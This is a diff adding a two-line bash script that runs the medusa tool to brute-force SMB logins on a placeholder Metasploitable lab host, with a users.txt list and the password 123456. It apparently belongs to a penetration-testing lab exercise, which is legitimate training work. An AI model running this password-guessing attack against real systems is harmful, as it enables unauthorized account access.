@@ -1,0 +1,2 @@
+#!/bin/bash
+medusa -h <IP-do-Metasploitable> -U users.txt -p 123456 -M smbnt
